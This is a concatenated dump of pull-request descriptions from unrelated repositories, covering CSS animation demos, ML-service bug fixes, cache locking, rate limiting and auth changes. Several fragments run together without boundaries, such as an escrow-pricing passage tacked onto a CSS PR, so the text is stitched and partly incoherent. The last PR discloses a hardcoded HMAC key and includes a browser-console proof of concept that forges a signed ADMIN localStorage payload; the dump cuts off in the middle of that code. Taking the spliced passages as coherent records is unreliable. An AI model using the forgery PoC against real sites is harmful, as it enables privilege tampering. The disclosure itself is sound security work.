prs.body:
## Description

Adds `submissions/examples/property-corner-radius-morph-sk/` — four `@property` typed `<length>` tokens (`--r-tl`, `--r-tr`, `--r-br`, `--r-bl`) that map to individual `border-radius` corners, enabling independent per-corner animation in `@keyframes` and `transition`.

## Why `@property` is needed

`border-radius` shorthand interpolation treats all four corners as a unit — you can't animate them at different rates or on different timings. By registering each corner as a typed `<length>`:

```css
@property --r-tl { syntax: '<length>'; inherits: false; initial-value: 16px; }
/* ... repeat for --r-tr, --r-br, --r-bl */

.shape {
  border-radius: var(--r-tl) var(--r-tr) var(--r-br) var(--r-bl);
}
```

Each corner becomes independently animatable and transitionable.

## Variants

1. **Corner ripple** — 8-step `@keyframes` rounds corners sequentially (TL → TR → BR → BL → back)
2. **Square ↔ circle** — all four corners morph together with `ease-in-out`
3. **Organic blob** — asymmetric values produce a natural blob shape that morphs continuously
4. **Hover diagonal** — `transition` on all four tokens with `cubic-bezier(0.34, 1.56, 0.64, 1)` spring easing

## Files added

- `demo.html` — 2 sections, 4 animated/interactive shapes with aria labels
- `style.css` — 4 `@property` declarations, 4 `@keyframes`, `prefers-reduced-motion` override
- `README.md` — explains why `@property` is needed, all variant patterns

## Checklist

- [x] Only `submissions/examples/` touched
- [x] Exactly 3 files: `demo.html`, `style.css`, `README.md`
- [x] `prefers-reduced-motion: reduce` implemented
- [x] No changes to `core/`, `components/`, `docs/`
- [x] Closes #20799

prs.body:
## Description

Adds `submissions/examples/split-flap-display-sk/` — an airport departure board (Solari board) animation using CSS `rotateX`, `perspective`, `overflow: hidden`, and staggered `animation-delay`. No images, no JavaScript animation loops, no `<canvas>`.

## Three-layer tile architecture

Each `.flap` tile has three stacked layers:

```
┌─────────────────────────────────┐  ← tile border
│  .flap-top    (current char,    │
│               top half)         │
├─────────────────────────────────┤  ← center line
│  .flap-bottom (next char,       │
│               bottom half)      │
└─────────────────────────────────┘

+ .flap-scene > .flap-flip  (animating overlay, covers top half)
```

The flip rotates `rotateX(0deg → -90deg)` around `transform-origin: bottom center` — at 90deg it's edge-on (invisible), revealing the bottom half. This produces the characteristic half-fold look.

## 3D setup

```css
.flap-scene {
  perspective: 200px;
  perspective-origin: 50% 100%; /* vanishing point at hinge */
}
```

## Cascade via CSS custom property

```css
.flap-flip {
  animation: ease-flip-cycle 0.9s cubic-bezier(0.25, 0.1, 0.25, 1) infinite;
  animation-delay: var(--flap-delay, 0s);
}
```

Each tile sets `--flap-delay` as an inline style (`0s`, `0.12s`, `0.25s`…) for the staggered cascade.

## Files added

- `demo.html` — digit row (HH:MM:SS format) and letter row with cascade
- `style.css` — tile structure, 3D perspective setup, `@keyframes ease-flip-cycle`, `prefers-reduced-motion` override
- `README.md` — layer architecture diagram, 3D setup explanation

labels.name: animation

prs.body:
## Description

Adds `submissions/examples/drop-shadow-motion-trail-sk/` — a velocity-aware motion trail effect built from stacked `filter: drop-shadow()` layers. The shadow offsets animate in sync with the element's direction of travel — pointing opposite to the motion at all times, so the trail always appears to stream behind.

## Technique

Three shadow layers create a depth gradient: near shadow (high opacity, small blur) → mid shadow → outer diffuse glow (low opacity, large blur). The offsets are baked into the same `@keyframes` as the `transform`:

```css
@keyframes ease-trail-bounce {
  0% {
    transform: translateX(-120px);
    filter:
      drop-shadow(12px 0 6px rgba(249, 115, 22, 0.70))
      drop-shadow(22px 0 10px rgba(249, 115, 22, 0.40))
      drop-shadow(34px 0 16px rgba(249, 115, 22, 0.20));
  }
  50% {
    transform: translateX(120px);
    filter:
      drop-shadow(-12px 0 6px rgba(236, 72, 153, 0.70))
      drop-shadow(-22px 0 10px rgba(236, 72, 153, 0.40))
      drop-shadow(-34px 0 16px rgba(236, 72, 153, 0.20));
  }
}
```

## Variants

1. **Horizontal bounce** — orange orb bounces left/right; shadow flips direction and color at each turnaround
2. **Vertical oscillation** — indigo square oscillates up/down; vertical offsets point opposite to travel
3. **Orbital trail** — dot orbits via `offset-path`; a second synchronized `@keyframes` rotates the shadow offset to stay behind the direction of travel

## `drop-shadow()` vs `box-shadow`

`filter: drop-shadow()` traces the element's actual alpha channel, not its border box — correct for circles and non-rectangular shapes.

## Files added

- `demo.html` — 3 animated sections with aria labels
- `style.css` — `@keyframes ease-trail-bounce`, `ease-trail-fall`, `ease-trail-orbit`, `prefers-reduced-motion` override
- `README.md` — technique explanation, layer structure, `drop-shadow` vs `box-shadow` comparison

prs.body:
## Description

Adds `submissions/examples/blend-difference-sweep-sk/` — a `::after` pseudo-element sweeper that uses `mix-blend-mode: difference` to invert all colors beneath it as it passes. No JavaScript, no hardcoded complementary color values — the math is pure CSS compositing.

## Technique

The sweeper is a white `::after` pseudo-element positioned at `left: -110%`. On hover or via `@keyframes`, it translates to `left: 150%`. Because `mix-blend-mode: difference` computes `|destination - source|`, a white (255,255,255) overlay over any color `C` produces `(255-R, 255-G, 255-B)` — its exact visual complement.

`isolation: isolate` on the parent is **required** to cap compositing to the card's own pixel stack; without it the blend bleeds to the page background.

## Files added

- `demo.html` — 4 variants: hover sweep, auto-loop sweep, `exclusion` softer variant, and a side-by-side `isolation: isolate` comparison demo
- `style.css` — CSS custom properties for sweep width/skew/duration, `@keyframes ease-blend-sweep`, `prefers-reduced-motion` override
- `README.md` — explains `difference` vs `exclusion`, why `isolation: isolate` is required, and accessibility section

prs.title: fix(xai): use TreeExplainer/LinearExplainer instead of generic PermutationExplainer
prs.body:
Fixes #496.

## What was wrong

`_init_explainer` always called `shap.Explainer(self.model.predict, background_data)`. Passing a Python callable forces SHAP to select `PermutationExplainer`, which evaluates the model hundreds of times per feature per sample. For tree models this is 100-1000x slower than `TreeExplainer`, which reads SHAP values directly from the tree structure.

## What changed

**`src/mlProject/components/xai_explainer.py`**

- Added `_TREE_ESTIMATOR_TYPES` and `_LINEAR_ESTIMATOR_TYPES` frozensets to identify estimator kind without importing each class
- Added `_split_pipeline()` to extract the preprocessor (all steps before the last) and the final estimator from the sklearn Pipeline
- Added `_transform_features()` helper so `explain_instance` and `get_global_importance` can feed pre-transformed data to the estimator-level explainer
- In `_init_explainer`:
  - Tree models → `shap.TreeExplainer(estimator)` (reads tree paths, no sampling loop)
  - Linear models → `shap.LinearExplainer(estimator, transformed_background)`
  - Unknown estimator types → existing `shap.Explainer(self.model.predict, bg)` fallback (no regression on unsupported model types)
  - Background data is sampled to 100 rows using a seeded RNG before transformation
- Logs which explainer type was selected to make debugging easier

The fallback path is unchanged so any model type not in the two frozensets keeps working exactly as before.

prs.title: fix(observability): create APILogger singleton and enable SQLite WAL mode
prs.body:
Fixes #499. Also fixes the pre-existing IndentationError in `_run_training_in_background()` (fixes #463).

## What changed

**`app.py`**
- Added `_api_logger = APILogger()` at module level so the instance is created once at startup
- Removed `APILogger()` call from `after_request` — now uses the singleton
- Dropped the wrapping `try/except` in `after_request` since `log_request` handles its own errors internally
- Fixed pre-existing `IndentationError` in `_run_training_in_background()` (8-space indent block under function body) and removed redundant `is_training = False` inside that guard

**`src/mlProject/components/observability.py`**
- Added `PRAGMA journal_mode=WAL` and `PRAGMA busy_timeout=5000` in `_init_db()` so concurrent Gunicorn workers don't block each other on writes
- Changed `except Exception: pass` in `log_request` to `logger.warning(...)` so write failures are visible in logs instead of silently dropped

## Why it matters

Under Gunicorn with 2+ workers, each request was opening two SQLite connections (one in `__init__` via `_init_db`, one in `log_request`). WAL mode allows concurrent reads and one writer without readers blocking each other. The silent swallow meant log failures from lock contention went completely unnoticed.

prs.title: fix(auth): drop TRAIN_SECRET fallback from require_admin_token
prs.body:
Fixes #495, Fixes #463

### Problem

`require_admin_token` resolved the expected credential like this:

```python
expected = os.environ.get("ADMIN_TOKEN") or os.environ.get("TRAIN_SECRET", "")
```

When `ADMIN_TOKEN` is not set, the empty string is falsy, so `expected` silently becomes `TRAIN_SECRET`. Any caller holding only the training token could then authenticate against all `/models/*` admin endpoints including `/models/rollback`.

The decorator also accepted `X-Train-Token` as a header source for admin auth, which is the header used specifically for `/train`.

### Fix

- `expected = os.environ.get("ADMIN_TOKEN", "")` — no fallback to `TRAIN_SECRET`
- Removed `X-Train-Token` from the header list in this decorator
- When `ADMIN_TOKEN` is not configured, the static-token branch fails for all callers; JWT with `role: Admin` remains the only auth path

### Also fixed

Pre-existing `IndentationError` in `_run_training_in_background()` (reported in #463): the `if not _acquire_training_file_lock()` block had 8-space indent (double-nested) instead of 4, and contained a redundant `is_training = False` that duplicated the `finally` block. The syntax error made the file unparseable.

prs.title: fix(data_transformation): remove dead train_scaled.csv / test_scaled.csv writes
prs.body:
Fixes #498

### What

`DataTransformation.train_test_spliting()` was writing `train_scaled.csv` and `test_scaled.csv` on every training run. Neither file is read by any downstream component:

- `ModelTrainer` reads `train.csv` (raw) and applies `preprocessor.transform()` itself
- `ModelEvaluation`, `DriftDetector`, `XAIExplainer` all use the raw CSVs or `preprocessor.joblib`
- `dvc.yaml` does not track these files at all

Making the waste concrete: `train_scaled.csv` had 14 columns (11 `NUMERIC_FEATURES` + 3 engineered: `acidity_index`, `alcohol_sugar_ratio`, `free_sulfur_pct`) while every consumer expects 11. Any future developer loading this file would hit an immediate shape mismatch.

### What changed

Removed the construction of `train_scaled_df`, `test_scaled_df`, `train_target`, `test_target`, and the conditional write block. The `preprocessor.fit_transform()` call is kept because it fits the preprocessor — only the resulting DataFrame and CSV write are dropped. The `preprocessor.joblib` save is untouched.

24 lines deleted, 0 added.

prs.title: fix(model_trainer): record hyperparams for all model types in registry
prs.body:
Fixes #497

### What

`model_info.json` and the model registry stored `params: {}` for any winning model that wasn't ElasticNet. The ternary on line 144 hardcoded ElasticNet-specific keys and fell through to an empty dict for RandomForestRegressor, GradientBoostingRegressor, and XGBoost — which are the models that typically win the benchmark on this dataset (confirmed by mlruns artifacts: `params/model_type = RandomForestRegressor`).

This means the production registry entry had no record of `n_estimators`, `max_depth`, `learning_rate`, etc. Retraining from registry metadata could not reproduce the same model.

### How

Replaced the ternary with `_extract_hyperparams(model, model_name)`, a small helper that reads the actual attributes set on the estimator via `getattr`. It covers the 12 attributes used across all four candidate models. No changes to the evaluation or registry write path — `model_evaluation.py` already reads `params = model_info.get("params", {})` generically.

Also restores the full `ModelTrainer` class and `train()` method that PR #332 inadvertently dropped when it replaced the file with a standalone function. `stage_04_model_trainer.py` imports `ModelTrainer` directly, so the pipeline was broken. The cross-validation helper from PR #332 is preserved as `train_with_cv()` on the class.

### Verification

```bash
# Before: XGBoost win → params: {}
# After:  XGBoost win → params: {model_type, n_estimators, max_depth, learning_rate, random_state, ...}
python3 -c "
from src.mlProject.components.model_trainer import _extract_hyperparams
from xgboost import XGBRegressor
m = XGBRegressor(n_estimators=100, max_depth=6, learning_rate=0.1, random_state=42)
print(_extract_hyperparams(m, 'XGBoost'))
"
```

prs.title: fix(LiveCodeRunner): cap output at 4KB and share at 1KB to prevent browser freeze
prs.body:
Fixes #1230

## What changed

`LiveCodeRunner` was storing and rendering the full Piston API response (up to 64 KB) with no length cap. `whitespace-pre-wrap` on that volume of text triggers expensive browser layout recalculations, freezing the tab. The Share button then broadcast the entire string to every participant in the study room.

**`runCode()`** — added a `truncate` helper that slices output at 4096 characters and appends a notice with the total character count. Applied to success output, runtime errors, and compilation errors.

**SIGKILL handling** — if `data.run.signal === "SIGKILL"`, we now show "Execution timed out or memory limit exceeded." instead of displaying partial output.

**`handleShare()`** — caps the output at 1024 characters before passing it to `onShare`, so the chat message sent to room participants stays small.

## Testing

Run `print("A" * 60000)` in the Python runner — output should be cut to 4096 chars with a truncation notice. Click Share — the chat message should contain at most 1024 chars.

prs.body:
## What

Adds `submissions/examples/backdrop-depth-of-field-sk/` — two CSS-only demos that simulate a camera depth-of-field effect using `backdrop-filter: blur()` and `brightness()`.

## How it works

**Animated focus pull** — a scene split into three vertical planes. Each plane has its own `@keyframes` that cycles `blur(0px)` (in focus) at a different time in the animation cycle, so the "sharp plane" migrates from Near → Mid → Far continuously.

**Hover card stack** — three cards at `translateZ(-60px)`, `translateZ(-24px)`, and `translateZ(0)`. On `:hover`, `backdrop-filter: blur()` increases on the back cards and drops to zero on the front, while `scale` and `translateZ` fan them apart. The result simulates shallow depth-of-field as the front card comes forward.

`brightness()` is chained with `blur()` to darken out-of-focus elements, matching how real camera bokeh works.

## Files

| File | Purpose |
|---|---|
| `style.css` | Scene layout, three-plane focus keyframes, card stack hover transitions, reduced motion |
| `demo.html` | Two independent demo sections |
| `README.md` | Explains the technique and `backdrop-filter` stacking context requirement |

Closes #17865

## What

Adds `submissions/examples/animated-marker-pulse-list-sk/` — three list variants where each item's bullet pulses independently with a staggered delay driven entirely by CSS custom properties.

## How it works

Each `<li>` carries `--i` inline. The CSS computes `animation-delay: calc(var(--i, 0) * Ns)` so items beat one after another rather than in unison — a wave effect with zero JavaScript.

`::before` is used instead of `::marker` because `transform` and `box-shadow` are not animatable on `::marker` in most browsers.

| Hue shift | Colour disc | `@property --pulse-hue` angle → `oklch()` |

## What

Adds `submissions/examples/property-oklch-hue-cascade-sk/` — a CSS-only demo showing `@property` angle interpolation used to drive smooth hue rotation in `oklch()`.

## How it works

`--hue` is registered as `syntax: "<angle>"` so the browser can interpolate mod-360 through `oklch(65% 0.22 var(--hue))`. Without the `@property` declaration the browser treats `--hue` as a string and the animation breaks.

Five cards share the same `hue-spin` keyframe (`0deg → 360deg`) but each has `animation-delay: calc(var(--i, 0) * -0.8s)`, spreading them 72deg apart at any given moment.

A second row runs the identical cascade in `hsl()` to illustrate perceptual non-uniformity — yellow spikes bright, blue looks dim — while the oklch row maintains even perceived lightness at every hue.

## Files

| File | Purpose |
|---|---|
| `style.css` | `@property --hue` + `@property --hue-hsl`, card layout, both keyframes, `prefers-reduced-motion` |
| `demo.html` | Two rows of 5 cards with `--i` 0-4, OKLCH top, HSL bottom, caption strip |
| `README.md` | Explains angle interpolation requirement and oklch perceptual uniformity |

prs.body:
## Pull Request Description Visual side-by-side demo of `overscroll-behavior: auto | contain | none`. prs.title: fix(neo4j): guard _subgraph_cache with RLock to prevent concurrent corruption
prs.body:
## Description of Changes
**Fixes #1523**

`asyncio.to_thread()` dispatches the scoring pipeline and blast-radius computation to a `ThreadPoolExecutor` (`main.py:1849`, `2906`). Both reach `Neo4jGraphProvider` methods that read and mutate `self._subgraph_cache` (an `OrderedDict`). The class docstring claims thread safety, but there was no lock anywhere in `__init__` or the cache methods.

`OrderedDict.move_to_end()` spans multiple bytecodes. Two threads calling it concurrently on the same dict can produce:
- `RuntimeError: dictionary changed size during iteration` in `_cleanup_expired_subgraph_cache`
- `KeyError` in `_get_cached_subgraph` between `get()` and `move_to_end()`
- Silent LRU corruption where evicted entries survive and live entries are dropped

Changes:
- `import threading` added
- `self._cache_lock = threading.RLock()` initialized in `__init__` after `_subgraph_cache`
- `with self._cache_lock:` wrapping added to `_invalidate_subgraph_cache_for`, `_get_cached_subgraph`, and the active 4-arg `_store_cached_subgraph`
- `RLock` chosen over `Lock` so re-entrant acquisition works if a lock-holding caller invokes a second locked method on the same thread

## How Has This Been Tested?
- [x] `python3 -m py_compile src/core/providers/neo4j.py` passes
- [x] 100 concurrent threads hammering all three cache methods simultaneously — zero `RuntimeError` or `KeyError`, final cache size consistent with expected LRU eviction
- [x] Verified `import threading`, `RLock()` init, and `with self._cache_lock:` blocks all present in the final file

## Checklist
- [x] My code follows the style guidelines of this project
- [x] My changes generate no new warnings

prs.body:
## Description of Changes
**Fixes #1522**

Two problems in the batch triage loop:

**1. Per-row UI mutations.** `status_text.text()` and `progress_bar.progress()` were called inside the inner `for _, row` loop. For a 500-row CSV with the default `BATCH_CHUNK_SIZE=50`, this sent 1000 Streamlit WebSocket delta frames per run. Each frame triggers a React reconciliation pass in the browser. Under real API response times the queue backs up and the session can freeze or drop.

**2. Error widget accumulation.** `st.error()` called inside a loop appends a new permanent widget to the page on each call — it does not replace the previous one. After 10+ failed rows the UI fills with stacked red boxes.

Fix:
- Added `error_placeholder = st.empty()` once before the outer loop
- Replaced both `st.error()` calls with `error_placeholder.error()` — all errors write to the same slot
- Moved `progress_bar.progress()` and `status_text.text()` outside the inner row loop to the outer chunk loop boundary, so UI updates fire once per chunk (every 50 rows by default) instead of once per row

## How Has This Been Tested?

`ensure_model_trained()` is defined in app.py but never called. The auto-train-on-first-run logic only exists for the gunicorn path (gunicorn.conf.py has its own `_ensure_model_trained`). So a fresh clone started with `python app.py` (the documented local dev option) never trains a model, and the first `/predict` fails when it tries to load a missing model file.

prs.body:
## Description of Changes
**Fixes #1521**

`_get_metrics_lock()` called `getattr(state, "metrics_lock", None)`, which invokes the `@property` on `AppState`. The property never returns `None` — it lazy-creates an `asyncio.Lock()` on first access and stores it on `_metrics_lock`. So the `if metrics_lock is None` branch was permanently dead code. The subsequent `state.metrics_lock = metrics_lock` assignment would `AttributeError` against the data descriptor on any Python that enforces it.

The function created a false impression of a second, independent lock mechanism while all callers were already routing through the single `@property`. This makes auditing the critical section impossible — a reader can't tell whether `get_stats` and `check_transaction` were guarded by the same lock object or not.

Deleted `_get_metrics_lock()` and replaced both callsites with `state.metrics_lock`. Lock creation and ownership now live in one place: the `@property` on `AppState`.

prs.title: fix(neo4j): remove duplicate _store_cached_subgraph and restore TTL cleanup on store path
prs.body:
## Description of Changes
**Fixes #1520**

`Neo4jGraphProvider` had two definitions of `_store_cached_subgraph` with different signatures. Python's method resolution kept only the second (4-arg) one, silently dropping the `_cleanup_expired_subgraph_cache(now)` call that existed in the first (3-arg) definition.

Effect: the cleanup call never ran from the store path. Only LRU count-based eviction (`while len > cache_max_entries`) ever fired. Expired cache entries accumulated indefinitely until they happened to be the oldest when capacity was hit — stale subgraph topology could persist and return incorrect risk scores.

Changes:
- Deleted the dead 3-arg definition (lines 169-173)
- Added `_cleanup_expired_subgraph_cache(now)` back into the surviving 4-arg definition
- Replaced the O(N) full-scan in `_cleanup_expired_subgraph_cache` with an O(k) front-scan that stops at the first non-expired entry (valid because `OrderedDict` maintains insertion/LRU order, so the oldest entries are always at the front)

## How Has This Been Tested?
- [x] `python3 -m py_compile src/core/providers/neo4j.py` passes
- [x] Isolated logic test: storing 2 entries, advancing past TTL, storing a 3rd — verified only 1 entry remains after cleanup
- [x] LRU count-based eviction still works: 4 stores with max_entries=3 leaves exactly 3 entries
- [x] AST check confirms only one `_store_cached_subgraph` definition exists after the fix

prs.title: fix(registry): fail closed when registry file is corrupt
prs.body:
Closes #340

`load_registry` caught a parse/IO error on the registry file and returned `{"production": None, "staging": None, "versions": []}`. The mutating callers (`register_model`, `update_registration`, `rollback_to_version`) all do load -> mutate -> `save_registry`, so that empty dict gets written straight back over the file, destroying every registered version and the production pointer when the original was only corrupt, not gone.

Now an existing-but-unparseable file raises `RegistryError` (after copying it to `registry.json.corrupt-<timestamp>` for recovery), so writers abort instead of overwriting. A missing file still returns the empty default as before.

Read-heavy callers (health, prediction) already wrap registry access in try/except, so they degrade gracefully.

Added tests for the missing-file default, the raise on corrupt input, and that a corrupt file is preserved + backed up after a failed register_model.

prs.title: fix(api): enforce input range bounds on /api/predict
prs.body:
Closes #339

`/predict` (the form) validates the 11 features against domain bounds (positivity, pH in 0-14). `/api/predict` only checked that the values were numeric, so a JSON request with `pH: -50` or `alcohol: -999` got accepted and returned a prediction, while the same values are rejected in the browser.

Pulled the boundary checks out of `index()` into a `_validate_wine_features` helper and call it from both handlers, so they share one validation contract. Form path still returns 400; the API now returns 422 with the offending field instead of a 200.

`_PREDICT_FIELDS` is now derived from the same rules table so the field list cannot drift from the validation.

Added tests covering out-of-range, non-numeric, and missing-field JSON payloads. Full test suite passes locally.

prs.title: fix(evaluation): keep baseline R2 at zero for integer targets
prs.body:
Closes #338

`baseline_r2_score` is supposed to return the R2 of a predict-the-mean model, which is 0.0 by definition. It was returning a negative value.

The cause is `np.full_like(actual, np.mean(actual))`. `actual` is the `quality` column (int64 per schema.yaml), and `np.full_like` inherits that dtype, so the mean (e.g. 5.9) gets truncated to 5 before filling. The array is no longer the mean, so its R2 drops below zero.

Switched to `np.full(np.shape(actual), np.mean(actual), dtype=float)` so the fill value stays a float regardless of the target dtype.

Added `tests/test_model_evaluation.py` with a regression test asserting the baseline is ~0 for an integer target array. Verified it fails on the old line and passes after the fix.

Repro of the original behavior:

```
actual = [5, 6, 7, 5, 6, 8, 4, 5, 6, 7]   # mean 5.9
old: baseline_r2 = -0.6279...
new: baseline_r2 = 0.0
```

prs.title: fix(rate-limit): add per-user limiter so shared-IP clients aren't throttled together
prs.body:

## What

`globalLimiter` is applied to all of `/api/` and keyed only by client IP. Mobile carriers route many users through a small pool of CGNAT IPs, so independent users share one 200-req/15min bucket and throttle each other. The limiter also runs before `authenticate`, so it can't key by user there.

## Change

- Added `userLimiter`, keyed by `req.user.id` (falling back to uid, then IP), applied in the route chains right after `authenticate` where `req.user` exists. Same place/pattern as the existing `bidLimiter`.

I applied `userLimiter` in the route definitions rather than inside `authenticate`, to avoid coupling the auth middleware to the rate limiter (and pulling Redis into every auth unit test). Public routes (faqs, otp/verify) are untouched.

prs.title: perf(auth): cache supabase profile lookups bounded by token expiry
prs.body:
Fixes #643

## What

The supabase token branch in `authenticate` did a `supabase.auth.getUser(token)` plus a `profiles` query on every request, with no caching. The firebase branch already has a Redis profile cache. The customer Flutter app authenticates with supabase sessions (`api_client.dart` sends the supabase access token), so the uncached branch is the one carrying most traffic.

## Change

Added supabase variants to `profileCache.js` (`getCachedSupabaseProfile` / `setCachedSupabaseProfile` / `invalidateCachedSupabaseProfile` / `isValidCachedSupabaseProfile`), keyed by the profile UUID under `user:profile:sb:<id>`. In `authenticate`, on a cache hit the profiles query is skipped; on a miss the profile is cached (with a tombstone for not-found).

Two things I was careful about:
- The cache is only read **after** `getUser` verifies the token. I did not skip `getUser`, because the token signature isn't verified locally (no JWT secret configured), so trusting an unverified `sub` for the cache key would be an auth bypass. This still removes the second round-trip (the profiles query) and adds negative caching.
- The cache TTL is clamped to the token's remaining lifetime (`min(TTL_SECONDS, exp - now)`) so a cached profile can't outlive the token that authorised it.

Profile mutation routes now invalidate the supabase cache entry next to the existing firebase invalidation.

Skipping `getUser` entirely via local JWT verification would need a `SUPABASE_JWT_SECRET` and is a separate change.

## Testing

- Added auth unit tests: cache hit skips the profiles query; miss caches with an exp-bounded TTL.
- Updated the two profile-route integration mocks to expose the new export.
- `npm test` -> 427 passing.

## What does this PR do?

The active branch of `/api/heartbeats` read `total_heartbeats` / `active_seconds` and then wrote `value + 1` per heartbeat. Two flushes for the same session (two editor windows, or a retried batch) both read the same base and the second overwrites the first, so increments get lost. It also ran a SELECT plus an upsert for every heartbeat, so a full 25-item batch was up to 50 sequential round-trips.

In the route, active heartbeats are now aggregated per session (counters summed, descriptive fields last-writer-wins) and persisted with one RPC call per session instead of a query per heartbeat. Offline signals stay a direct update.

prs.title: fix(rate-limit): defer Redis store selection until the client is ready
prs.body:
Fixes #642

## What

The rate limiters are constructed when `rateLimiter.js` is first imported (via `index.js`), which happens before the ioredis client has finished connecting. At that point `redisClient.status` is `connecting`, so the old `buildStore()` returned `undefined` and every limiter was pinned to the in-memory store for the whole process lifetime. You can see it in the startup logs: four "Falling back to memory rate limiter" warnings printed right before "Connected to Upstash Redis server". So the cross-instance Redis limiting (including the auth/brute-force limiter) never actually ran.

## Change

Replaced the eager store pick with a `DeferredRedisStore` wrapper. It serves from an in-memory `MemoryStore` until `redisClient.status === 'ready'`, then constructs the `RedisStore` once and reuses it. If the RedisStore ever fails to construct, it stays on memory and doesn't retry on every request.

No change to limiter configs, route wiring, or `index.js`.

## Testing

- Added `test/unit/rateLimiter.test.js` covering: memory fallback while not ready, promotion to Redis once ready, instance reuse, and error fallback without retry.
- `npm test` -> 429 passing.

prs.title: perf(config): cache parsed YAML and registry path to avoid per-request reads
prs.body:
Closes #302

`ConfigurationManager.__init__` reads and parses `config.yaml`, `params.yaml` and `schema.yaml` on every instantiation, and `_get_registry_path()` builds a fresh `ConfigurationManager` on every `/health` hit. Uptime monitors poll `/health` frequently, so we re-parse three YAML files per request for data that never changes at runtime.

- `read_yaml` is now memoized with `lru_cache` keyed on the path, so each config file is parsed once per process. This also makes the repeated `ConfigurationManager()` calls in `PredictionPipeline` cheap. `read_yaml.cache_clear()` is available if a process ever needs to reload.
- `_get_registry_path()` is cached with `lru_cache(maxsize=1)` so `/health` stops constructing a `ConfigurationManager` after the first call.

Config files are treated as read-only everywhere, so sharing the cached ConfigBox is safe. Existing tests pass.

prs.title: fix(eval): compare new model against actual previous production, not itself
prs.body:
Closes #301

`metrics_comparison.json` always showed 0% change for every metric because `_load_previous_metrics` was called *after* `register_model`/`update_registration` had already flipped the production alias to the new version. So "previous" was the new model and the comparison was the model against itself.

Moved the `_load_previous_metrics` call up, before registration runs, so it captures the genuinely previous production metrics. The comparison block downstream is unchanged.

First-model case is still handled the same way (`previous_metrics` is `None`, comparison skipped).

prs.title: fix(registry): make rollback take effect on live prediction pipeline
prs.body:
Closes #300

`/models/rollback` returned 200 but live traffic kept getting the old model until a restart.

Two reasons:
- `PredictionPipeline` resolved its watched path once at startup to the *versioned* production file (`model_<id>.joblib`). The mtime hot-reload in `predict()` only fires when that exact file changes, but rollback writes onto the stable `model.joblib` and a different versioned file, so the watched file never changed.
- `rollback_to_version` restored `model.joblib` but never updated `model_info.json`, so `/health` reported a stale `active_model_version`.

Changes:
- `PredictionPipeline.__init__` now prefers the stable `model.joblib` (rewritten on both promotion and rollback) as the watched path; the versioned path stays as a fallback. The existing mtime reload now picks up rollbacks across all workers without a restart.
- `rollback_to_version` rewrites `model_info.json` with the rolled-back version so `/health` is accurate.

Added `test_rollback_refreshes_model_info`. Full `tests/test_model_registry.py` passes (12 tests).

prs.body:
## 🛠️ Description of Changes

**Fixes #1430**

`src/api/main.py` had its own `LRUCache(OrderedDict)` with no locking, and it backs process-global state that's mutated from FastAPI's threadpool (`centrality_baseline`, `batch_subgraph_cache`). `src/adaptive_auth/store.py` already had a separate, fully locked copy of the same class. prs.body:
## 🛠️ Description of Changes

**Fixes #1429**

`verify_challenge` only checked `is_expired()` and `is_max_attempts_reached()` - it never looked at `challenge.status`. A completed challenge stays in the store until cleanup runs, so resubmitting the same `challenge_id` and code within the timeout window re-ran the success branch and bumped `session.trust.trust_score` by another +0.2 each time. prs.title: fix(adaptive-auth): guard session index mutations with the store lock
prs.body:
## 🛠️ Description of Changes

**Fixes #1428**

`AdaptiveAuthStore` had `self._lock = threading.RLock()` in `__init__` but never acquired it anywhere. The only locking was inside the inner `LRUCache`. That left the compound updates that touch both `_sessions` and the `_user_sessions` index running unsynchronized, so under concurrent access (FastAPI threadpool + the reassessment loop) the index could desync from the session store - orphaned IDs pointing at evicted sessions, or live sessions missing from the index.

Wrapped the methods that mutate `_user_sessions` together with `_sessions` in `with self._lock:`:

- `create_session` - the `_sessions` write + index add
- `terminate_session` - lookup + status update + index discard
- `cleanup_expired_sessions` - the scan + paired deletes
- `get_user_sessions` - reads both, now takes a consistent snapshot

`_lock` is an `RLock` and is always acquired before the per-cache locks, so there's no deadlock or lock-ordering issue.

## 🧪 How Has This Been Tested?

- [x] 16 threads creating 2000 sessions for one user -> index size matches exactly
- [x] Concurrent termination of half -> index and `get_user_sessions` both settle at the correct count

prs.body:
## Description

Closes #12426

Demonstrates the pattern where a single `@keyframes` block drives entirely different animations on different elements by reading `var()` references that resolve per-element from inline custom properties.

**The keyframe:**

```css
@keyframes parametric-motion {
  from { transform: translate(0, 0) rotate(0deg) scale(1); }
  to {
    transform:
      translate(var(--travel-x, 0px), var(--travel-y, -60px))
      rotate(var(--rotation, 0deg))
      scale(var(--end-scale, 1));
  }
}
```

**All five animation variants use the same `.motion-atom` class and the same `@keyframes` — only the inline custom properties differ:**

| Atom | `--travel-x` | `--travel-y` | `--rotation` | `--end-scale` | `--duration` | `--easing` |
|------|-------------|-------------|-------------|--------------|-------------|-----------|
| Float Up | 0px | -60px | 0deg | 1 | 1.4s | ease-in-out |
| Slide & Scale | 50px | 0px | 0deg | 1.3 | 0.9s | cubic-bezier(overshoot) |
| Arc & Spin | 40px | -40px | 180deg | 0.7 | 1.1s | ease-out |
| Spring | 0px | -30px | -18deg | 1.15 | 0.65s | cubic-bezier(overshoot) |
| Drift | -25px | -40px | 6deg | 0.92 | 3.2s | ease-in-out |

Each atom sits in a fixed-size grid cell so the CSS layout stays stable while the box moves via `transform` inside it.

`bid_amount / 100` converts paisa to INR. Then `ethers.parseEther(INR_value)` treats that number as MATIC. A ₹5,000 bid (`bid_amount=500000`) would lock **5,000 MATIC** (~$2,000) on-chain for a $60 order.

## Fix

Replaced with a configurable `ESCROW_MATIC_PER_PAISA` env var that holds the explicit INR→MATIC exchange rate at the paisa granularity. If the var is not set the deposit is skipped with a warning (same existing behaviour as a missing wallet address). A `MAX_ESCROW_MATIC` cap rejects any deposit above the configured ceiling before it reaches the chain.

Both variables are documented in `.env.example`.

prs.title: fix: replace hardcoded HMAC signing key with per-session random key (secure-storage.js)
prs.body:
## 📄 Description

`secure-storage.js` used a hardcoded string `"cara_crypto_secure_key_v2"` as the HMAC-SHA-256 signing key. Because the key is visible in the unminified source served to every browser, anyone can read it and generate a valid HMAC signature for arbitrary `localStorage` data — bypassing the integrity check entirely. The log message `"SecureStorage integrity check failed. Data tampered."` gave a false sense of protection.

**Proof of concept (runs in browser console):**
```js
const SECRET = "cara_crypto_secure_key_v2"; // read from source
const fakeUser = JSON.stringify({ role: "ADMIN", email: "x@x.com" });
const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(SECRET),
  { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(fakeUser));
const payload = btoa(JSON.stringify({
  data: fakeUser,
  signature: btoa(String.fromCharCode(...new Uint8Array(sig)))
